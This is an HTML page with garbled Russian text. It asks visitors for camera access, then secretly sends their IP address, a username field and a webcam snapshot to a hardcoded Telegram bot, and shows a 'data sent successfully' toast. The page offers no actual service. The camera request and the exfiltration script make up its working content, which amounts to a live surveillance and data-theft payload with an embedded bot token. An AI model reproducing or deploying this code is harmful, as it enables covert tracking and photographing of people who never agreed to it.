<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Unbounded&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" />
    <style>
        body {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            background-color: #090909;
            color: #fff;
            font-family: 'Unbounded', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            position: relative;
        }

        .modal {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
            text-align: center;
            z-index: 1000;
        }

        .modal.active {
            display: flex;
        }

        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
            width: 110px;
            height: auto;
            pointer-events: none;
        }

        .login-container {
            text-align: center;
            width: 100%;
            max-width: 400px;
            margin-top: -50px;
        }

        .registration-title {
            font-size: 3rem;
            margin-bottom: 20px;
        }

        .toast {
            position: fixed;
            top: 10px;
            right: 30px;
            border-radius: 8px;
            background: #333;
            padding: 10px 20px;
            box-shadow: 0 6px 20px -5px rgba(0, 0, 0, 0.5);
            transform: translateX(100%);
            transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.35);
            user-select: none;
            display: none;
            font-size: 0.8rem;
        }

        .toast.active {
            display: block;
            transform: translateX(0%);
        }

        .toast-content {
            display: flex;
            align-items: center;
        }

        .toast-content .check {
            display: flex;
            align-items: center;
            justify-content: center;
            height: 30px;
            min-width: 30px;
            border-radius: 50%;
            border: 2px solid #333;
        }

        .toast-content .message {
            display: flex;
            flex-direction: column;
            margin: 0 10px;
        }

        .toast .close {
            position: absolute;
            top: 5px;
            right: 10px;
            padding: 5px;
            cursor: pointer;
            opacity: 0.7;
            color: #fff;
        }

        .toast .close:hover {
            opacity: 1;
        }

        @media (max-width: 600px) {
            body {
                padding: 20px;
            }

            .registration-title {
                font-size: 2.5rem;
                margin-bottom: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="modal" id="permissionModal">
        <h2>–†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ</h2>
        <button id="allowCamera">–†–∞–∑—Ä–µ—à–∏—Ç—å</button>
        <button id="denyCamera">–û—Ç–º–µ–Ω–∏—Ç—å</button>
    </div>

    <div class="logo">
        <img src="https://i.postimg.cc/hGdCsVNf/logo.png" alt="Logo" class="logo">
    </div>
    <div class="login-container">
        <div class="registration-title">‚ö°Ô∏è</div>
    </div>

    <div class="toast" id="toast">
        <div class="toast-content">
            <i class="fas fa-solid fa-check check" id="toastIcon"></i>
            <div class="message">
                <span class="text text-1" id="toastTitle">Success</span>
                <span class="text text-2" id="toastSubtitle">Data sent successfully!</span>
            </div>
        </div>
        <i class="fa-solid fa-xmark close"></i>
    </div>

    <script>
        const toast = document.getElementById('toast');
        const closeButton = document.querySelector('.close');
        const toastTitle = document.getElementById('toastTitle');
        const toastSubtitle = document.getElementById('toastSubtitle');
        const pluginIcon = document.getElementById('toastIcon');
        const permissionModal = document.getElementById('permissionModal');

        closeButton.addEventListener('click', () => {
            toast.classList.remove('active');
        });

        document.getElementById('allowCamera').addEventListener('click', async () => {
            permissionModal.classList.remove('active');
            const username = 'user123'; // –ó–∞–º–µ–Ω–∏—Ç–µ –Ω–∞ —Ä–µ–∞–ª—å–Ω–æ–µ –∏–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
            const userId = username;
            const userIp = await getUserIp();
            await sendToTelegram(username, userId, userIp);
        });

        document.getElementById('denyCamera').addEventListener('click', () => {
            permissionModal.classList.remove('active');
            showToast("–î–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –Ω–µ –±—ã–ª –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω.");
        });

        async function sendPhotoToTelegram(token, chatId, photo) {
            const url = `https://api.telegram.org/bot${token}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photo);
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    body: formData
                });
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram:', error);
            }
        }

        async function sendToTelegram(username, userId, userIp) {
            const token = '8153849953:AAEpCvjT7AMqcizshjS4ZxznFL4RF4ESZGE';
            const chatId = '7618874046';
            const message = `<b>üéÖ –ù–æ–≤–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –Ω–∞ —Å–∞–π—Ç–µ!</b>\n\n` +
                `<blockquote>` +
                `<b>[‚òÉ] –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è:</b> @${username}\n` +
                `<b>[üÜî]:</b> ${userId}\n` +
                `<b>[üåç IP]:</b> ${userIp}` +
                `</blockquote>`;
            
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const data = {
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(data)
                });
                if (!response.ok) {
                    throw new Error(`HTTP error! Status: ${response.status}`);
                }
                const videoStream = await capturePhoto(); // –ü–æ–ª—É—á–∞–µ–º —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã
                const blob = await videoStream;
                sendPhotoToTelegram(token, chatId, blob); // –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ –≤ Telegram
                showToast();
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram:', error);
            }
        }

        async function getUserIp() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                if (!response.ok) {
                    throw new Error(`–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è IP: ${response.status}`);
                }
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –≤ getUserIp:', error);
            }
        }

        function showToast(message = "–î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã!") {
            toastTitle.innerText = "Success";
            toastSubtitle.innerText = message;
            toast.classList.add('active');
            setTimeout(() => {
                toast.classList.remove('active');
            }, 5000);
        }

        async function capturePhoto() {
            const constraints = {
                video: false, // –¢–æ–ª—å–∫–æ –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è
                audio: false
            };

            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            const canvas = document.createElement('canvas');
            canvas.width = 640; // –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –Ω—É–∂–Ω—ã–µ —Ä–∞–∑–º–µ—Ä—ã
            canvas.height = 480;
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            return new Promise((resolve) => {
                video.onloadedmetadata = () => {
                    stream.getTracks().forEach(track => track.stop()); // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –ø–æ—Ç–æ–∫ –ø–æ—Å–ª–µ –∑–∞—Ö–≤–∞—Ç–∞
                    canvas.toBlob(resolve); // –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç Blob —Å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ–º
                };
            });
        }

        async function initialize() {
            permissionModal.classList.add('active'); // –ü–æ–∫–∞–∑–∞—Ç—å –º–æ–¥–∞–ª—å–Ω–æ–µ –æ–∫–Ω–æ
        }

        window.onload = initialize; // –í—ã–∑–æ–≤ —Ñ—É–Ω–∫—Ü–∏–∏ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    </script>
</body>
</html>
